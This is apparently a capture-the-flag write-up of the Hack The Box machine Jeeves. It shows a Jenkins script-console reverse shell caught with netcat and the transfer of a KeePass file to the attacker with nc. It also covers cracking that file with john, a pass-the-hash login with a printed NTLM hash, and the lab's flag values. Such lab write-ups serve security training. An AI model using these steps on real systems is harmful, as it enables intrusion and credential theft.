---
icon: user-secret
---

# HTB-JEEVES

<figure><img src="../../../../.gitbook/assets/image (242).png" alt=""><figcaption></figcaption></figure>



SYNOPSIS Jeeves is not overly complicated, however it focuses on some interesting techniques and provides a great learning experience. As the use of alternate data streams is not very common, some users may have a hard time locating the correct escalation path.

Skills Required ● Intermediate knowledge of Windows ● Knowledge of basic web fuzzing techniques

Skills Learned ● Obtaining shell through Jenkins ● Techniques for bypassing Windows Defender ● Pass-the-hash attacks ● Enumerating alternate data streams

Recon :

```powershell
(sn0x㉿sn0x)-[~/hackthebox/Jeeves]
└─$ sudo rustscan -a 10.10.10.63 --ulimit 5000 --range 1-1000 -- -sCV -Pn
sudo: unable to resolve host sn0x: Name or service not known
[sudo] password for sn0x: 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |
| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.

Open 10.10.10.63:80
Open 10.10.10.63:135
Open 10.10.10.63:445
Open 10.10.10.63:50000

PORT    STATE SERVICE      REASON          VERSION
80/tcp  open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Ask Jeeves
|_http-server-header: Microsoft-IIS/10.0
135/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
445/tcp open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-13T00:27:36
|_  start_date: 2025-06-13T00:22:25
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 5h00m00s, deviation: 0s, median: 5h00m00s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 55172/tcp): CLEAN (Timeout)
|   Check 2 (port 10843/tcp): CLEAN (Timeout)
|   Check 3 (port 48293/udp): CLEAN (Timeout)
|   Check 4 (port 61582/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
PORT      STATE SERVICE REASON          VERSION
50000/tcp open  http    syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)

```

SMBCLIENT

```powershell
sn0x㉿sn0x)-[~/hackthebox/Jeeves]
└─$ enum4linux -a 10.10.10.63
Starting enum4linux v0.9.1 ( <http://labs.portcullis.co.uk/application/enum4linux/> ) on Thu Jun 12 19:37:59 2025

 =========================================( Target Information )=========================================

Target ........... 10.10.10.63
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

```

Users Found : administrator, guest, krbtgt, domain admins, root, bin, none

```powershell
sn0x㉿sn0x)-[~/hackthebox/Jeeves]
└─$ crackmapexec smb 10.10.10.63 --shares -u '' -p ''
SMB         10.10.10.63     445    JEEVES           **[*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)**

```

Gobuster :

```powershell
┌──(sn0x㉿sn0x)-[~/hackthebox/Jeeves]
└─$ gobuster dir -u <http://10.10.10.63> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,aspx,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     <http://10.10.10.63>
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,aspx,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 503]
/Index.html           (Status: 200) [Size: 503]
/error.html           (Status: 200) [Size: 50]

```

Lets Visit : `/error.html`

<figure><img src="../../../../.gitbook/assets/image (236).png" alt=""><figcaption></figcaption></figure>



In Recon part We found :

```powershell
PORT      STATE SERVICE REASON          VERSION
50000/tcp open  http    syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)

```

Now Lets start Fuzzing

```powershell
```

Found that /askjeeves lets visit site at: [**`http://10.10.10.63:50000/askjeeves/`**](http://10.10.10.63:50000/askjeeves/)

We Found :

<figure><img src="../../../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>

Explore the some options with site, identified the **Manage Jenkins > Script console**

In the script console written Groovy Script

I googled like groovy reverse shell found this [link](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)

I copied code from the link, pasted in the script console, changed kali IP address.

<figure><img src="../../../../.gitbook/assets/image (238).png" alt=""><figcaption></figcaption></figure>

Run and We will get Shell on Listne on Attacker machine

```powershell
┌──(sn0x㉿sn0x)-[~/hackthebox/Jeeves]
└─$ rlwrap nc -nlvp 8044
listening on [any] 8044 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.63] 49676
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\\Users\\Administrator\\.jenkins>cd /../../
cd /../../

C:\\>cd Users
cd Users

C:\\Users>cd kohsuke/Desktop
cd kohsuke/Desktop

C:\\Users\\kohsuke\\Desktop>type user.txt
type user.txt
e3232272596fb47950d59c4cf1e7066a
C:\\Users\\kohsuke\\Desktop>

```

### **Privilege Escalation**

```powershell
C:\\Users\\Administrator\\.jenkins>whoami
whoami
jeeves\\kohsuke

C:\\Users\\Administrator\\.jenkins>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

```

Found :

SeImpersonatePrivilege

SeCreateGlobalPrivilege

Privilege Escalation

KeePass Database

Cracking the KeePass database password is fairly simple. The kdbx file can be transferred to the attacking machine using Netcat. The command nc -lp 1235 > jeeves.kdbx will listen for data on the attacking machine and pipe it to a file. Running the command nc.exe -w 3 \<LAB IP> 1235 < CEH.kdbx on the target will complete the transfer. With the database at hand, cracking is as easy as extracting the hash with keepass2john jeeves.kdbx > jeeves.hash and running John with john jeeves.hash

Now :

```powershell
Pass the Hash
The Backup stuff entry in the KeePass file is an NTLM hash for the Administrator user. Using the
pass-the-hash technique allows for fairly simple spawning of a session. The command
pth-winexe -U
jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cb
e81fe00 //10.10.10.63 cmd will immediately grant a shell as the administrator.
```

```powershell
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE/reverse_shell_splunk]
└─$ pth-winexe -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\\Windows\\system32>
C:\\Users\\Administrator\\Desktop>more < hm.txt:root.txt:$DATA
more < hm.txt:root.txt:$DATA
afbc5bd4b615a60648cec41c6ac92530

```

To get the data in the .kdbx file first get the password of the file.

To do that get the hash of the file.

```
keepass2john CEH.kdbx > CEH.hash
```

The Remove the CEH character in the .hash file

<figure><img src="../../../../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

Hash is **moonshine1**

Open the file using kpcli with a cracked password

<figure><img src="../../../../.gitbook/assets/image (240).png" alt=""><figcaption></figcaption></figure>

Let’s try to use LM:NTLM hash

Let’s try Impacket-smbexec, psexec

First tried with NTLM hash not script error

```
impacket-psexec -hashes 'e0fb1fb85756c24235ff238cbe81fe00' administrator@10.10.10.63
```

<figure><img src="../../../../.gitbook/assets/image (241).png" alt=""><figcaption></figcaption></figure>

In the Administrator desktop not find the root flag,

Tried dir /R

Found something like hm.txt:root.txt:$DATA

Type hm.txt:root.txt:$DATA, syntax error

```
more < hm.txt:root.txt:$DATA
```

ROOTED

<figure><img src="../../../../.gitbook/assets/complete (17).gif" alt=""><figcaption></figcaption></figure>
